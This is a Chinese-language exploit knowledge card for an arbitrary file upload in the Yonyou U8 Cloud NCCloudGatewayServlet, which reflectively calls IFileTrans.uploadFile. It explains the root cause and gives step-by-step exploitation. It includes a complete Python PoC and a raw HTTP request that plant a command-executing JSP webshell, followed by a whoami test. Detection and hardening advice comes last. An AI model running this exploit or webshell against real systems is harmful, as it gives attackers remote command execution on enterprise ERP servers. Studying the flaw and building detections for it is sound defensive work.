---
id: web-java-component-yonyou-u8-nccloudgateway-ifiletrans-file-upload
title: 用友 U8 Cloud NCCloudGatewayServlet 反射调用 IFileTrans 任意文件上传写 WebShell
type: scenario
domain: web
path: web/java/component
technique: yonyou-u8-nccloudgateway-ifiletrans-file-upload
aliases:
- 用友 U8 Cloud 任意文件上传
- NCCloudGatewayServlet 文件上传
- IFileTrans uploadFile
- gatewaytoken 文件上传
- 用友 U8 WebShell
- ZipUtil.extract 任意写文件
tags:
- java
- yonyou
- u8-cloud
- nccloud
- file-upload
- webshell
- reflection
- gatewaytoken
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:18:57+08:00'
  notes: 已对照原文及全部 24 张内联图核对：web.xml /service/* → NCInvokerServlet、nccloudgw.upm 组件映射、gatewaytoken 校验与 Encode.decode(nccloud.gateway.nctoken)、Gson 解析与 isAgg/isArray/isPrimitive 参数转换、GWUtil.getPrimitiveType(Byte→byte)、NCLocator.lookup 的 java:comp/env 限制、MethodUtils.invokeMethod 反射、IFileTrans.uploadFile 的 ZipUtil.extract+FileOutputStream 写路径均与截图一致；图 22 响应与图 23 落地 123.jsp 佐证。原文未写受影响版本区间，未设置 versions。PoC 未在本机执行。
---

## 一句话结论

用友 U8 Cloud 的 `/service/NCCloudGatewayServlet` 在通过 `gatewaytoken` 校验后，会按 JSON 中的 `serviceClassName/serviceMethodName/serviceMethodArgInfo` 反射调用服务方法；把 `serviceClassName` 设为 `nc.itf.hr.tools.IFileTrans`、方法设为 `uploadFile`，传入 ZIP 字节和目标路径，即可让 `ZipUtil.extract` 解压后把内容写到任意路径（如 `./webapps/u8c_web/123.jsp`），落地 JSP WebShell。

## 原理

- `web.xml` 把 `NCInvokerServlet` 映射到 `/service/*`；`nccloudgw.upm` 中 `NCCloudGatewayServlet` 对应 `com.yonyou.nccloud.gateway.adaptor.servlet.ServletForGW`。
- `ServletForGW.doAction()` 首先执行 `GateWayUtil.checkGateWayToken(request.getHeader("gatewaytoken"))`。校验逻辑把请求头与 `(new Encode()).decode(getProp().getProperty("nccloud.gateway.nctoken"))` 比较；token 来自配置文件，经过可复现的 `Encode.decode` 变换，配置泄露/默认值/备份可读即可获得。
- 校验通过后，Servlet 解析 JSON 的 `serviceInfo`，构造 `argTypes` 与 `argValues`：
  - `isAgg=false` 时，`argValue.body` 会经 `ConvertUtils.convert` 或 `GWUtil.convertToVOArray(argtype, jsonArrayList, isPrimitive)` 转成指定类型；
  - `argType.body="java.lang.Byte"`、`isArray=true`、`isPrimitive=true` 时，`GWUtil.getPrimitiveType` 把 `Byte.class` 转为 `byte`，JSON 数字数组被转成 `byte[]`。
- 随后 `NCLocator.getInstance().lookup(serviceClassName)` 获取服务实例（JNDI 部分限制在 `java:comp/env/`，但本地服务类可直接查找），再 `MethodUtils.invokeMethod(ncService, methodName, argValues, argTypes)` 反射调用。
- `nc.itf.hr.tools.IFileTrans.uploadFile(byte[] data, String remoteAbsPath)` 的实现：
  ```java
  data = ZipUtil.extract(data);
  FileOutputStream output = new FileOutputStream(remoteAbsPath);
  output.write(data);
  output.flush(); output.close();
  ```
  即先解压 ZIP，再把解压结果写到 `remoteAbsPath`；路径和扩展名均未校验，写入 Web 根目录即可执行 JSP。
- 该链与网关的命令注入变体共用入口与反射桥，但 sink 是文件写入而非命令拼接；只要目标有 `IFileTrans` 服务且 Web 根可写，就能获得 WebShell。

## 触发条件

- 目标为存在 `NCCloudGatewayServlet` 与 `IFileTrans` 的用友 U8 Cloud/NCCloud 版本，`/service/NCCloudGatewayServlet` 可从攻击者网络访问。
- 能获得或推导 `gatewaytoken`（配置文件 `nccloud.gateway.nctoken` 泄露、默认值未改、源码/备份可读）。
- 目标 classpath 存在 `nc.itf.hr.tools.IFileTrans`，且 `uploadFile` 可被反射调用。
- 目标 Web 根目录（如 `webapps/u8c_web/`）对应用进程可写，且 JSP 可被容器解析执行。
- 请求 JSON 的 `serviceInfo` 结构与参数类型匹配。

## 利用步骤

1. 访问 `/service/NCCloudGatewayServlet`，确认路由与响应特征。
2. 获取 `gatewaytoken`：从配置读取 `nccloud.gateway.nctoken`，用 `(new Encode()).decode(value)` 计算；或复用已泄露的 token。
3. 制作一个包含 JSP WebShell 的 ZIP；读取其字节。
4. 构造 JSON：`serviceClassName=nc.itf.hr.tools.IFileTrans`、`serviceMethodName=uploadFile`；第一个参数为 `byte[]`（`argType.body=java.lang.Byte`、`isArray=true`、`isPrimitive=true`，`argValue.body` 为 ZIP 字节数组）；第二个参数为 `java.lang.String`，值为目标绝对/相对路径。
5. 带 `gatewaytoken` 头发送 POST；观察响应（如 `{"agg":false,"retObj":true,"retClass":"Boolean"}`）。
6. 访问写入的 JSP（如 `/u8c_web/123.jsp`）验证执行；若路径不可访问，尝试其它 Web 根/相对路径。

## PoC

用 Python 生成 ZIP 字节与请求体：

```python
import io, json, zipfile, requests

jsp = '<%@ page import="java.util.*,java.io.*"%><% Process p=Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null){out.println(l);} %>'

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('shell.jsp', jsp)
data = list(buf.getvalue())

payload = {
  "serviceInfo": {
    "serviceClassName": "nc.itf.hr.tools.IFileTrans",
    "serviceMethodName": "uploadFile",
    "serviceMethodArgInfo": [
      {
        "argType": {"body": "java.lang.Byte"},
        "argValue": {"body": data},
        "agg": False, "isArray": True, "isPrimitive": True
      },
      {
        "argType": {"body": "java.lang.String"},
        "argValue": {"body": "./webapps/u8c_web/123.jsp"},
        "agg": False, "isArray": False, "isPrimitive": False
      }
    ]
  }
}

r = requests.post("http://target/service/NCCloudGatewayServlet",
                  headers={"gatewaytoken": "<TOKEN>", "Content-Type": "application/json"},
                  json=payload, timeout=15)
print(r.status_code, r.text)
```

等价 HTTP 请求（`<ZIP_BYTES>` 为 ZIP 的十进制字节数组）：

```http
POST /service/NCCloudGatewayServlet HTTP/1.1
Host: target
gatewaytoken: <TOKEN>
Content-Type: application/json

{"serviceInfo":{"serviceClassName":"nc.itf.hr.tools.IFileTrans","serviceMethodName":"uploadFile","serviceMethodArgInfo":[{"argType":{"body":"java.lang.Byte"},"argValue":{"body":[<ZIP_BYTES>]},"agg":false,"isArray":true,"isPrimitive":true},{"argType":{"body":"java.lang.String"},"argValue":{"body":"./webapps/u8c_web/123.jsp"},"agg":false,"isArray":false,"isPrimitive":false}]}}
```

成功响应示例：

```json
{"agg":false,"retObj":true,"retClass":"Boolean"}
```

随后访问 `http://target/u8c_web/123.jsp?cmd=whoami`。

## 变体与关联

- 变体：目标路径可改为其它可写目录/扩展名；若 Web 根不可写，可尝试写计划任务、启动脚本或配置（取决于进程权限）。
- 变体：`IFileTrans` 的其它方法或其它服务类若存在文件写入/命令执行 sink，可复用同一 JSON 反射桥。
- 变体：ZIP 内容可包含多个文件；`ZipUtil.extract` 的具体解压行为（取首个条目/全部）需按目标版本验证。
- 关联：[[web-java-component-yonyou-nccloud-gateway-reflection-command-injection]]（同一 `NCCloudGatewayServlet` 入口与反射桥，sink 为 `ProcessFileUtils.openFile` 命令注入；该卡已提示 `IFileTrans` 文件上传变体但未展开）。
- 关联：[[web/generic/file-upload]] 下的任意文件上传/WebShell 卡（通用落地与绕过）。
- 注意：`gatewaytoken` 是部署相关值，示例 token 不能视为通用；路径需按目标实际 Web 根调整。

## 检测与防御

- 修复：升级到官方修复版本/应用补丁；限制 `/service/*` 仅对可信来源开放，禁止公网直接访问。
- 加固：轮换并妥善保管 `nccloud.gateway.nctoken`，不要把可解码 token 放在可读配置/备份中；对 `serviceClassName`/`serviceMethodName` 做显式白名单，移除 `IFileTrans` 等危险服务的反射调用。
- 加固：Web 根目录对应用进程只读，上传目录禁止 JSP 解析；对 `ZipUtil.extract` 的输出路径/扩展名做校验，禁止绝对路径与 `..`。
- 检测：`/service/NCCloudGatewayServlet` 请求体出现 `IFileTrans`、`uploadFile`、`java.lang.Byte`、`isArray:true`、`isPrimitive:true`；请求体含大整数数组/ZIP 特征（`80,75,3,4`）；Web 根出现新 JSP；响应 `{"agg":false,"retObj":true}` 后紧跟 JSP 访问。
- 检测：服务端文件系统出现异常 JSP/脚本；`FileOutputStream` 写入 Web 根；`NCLocator.lookup`/`MethodUtils.invokeMethod` 调用异常服务名。
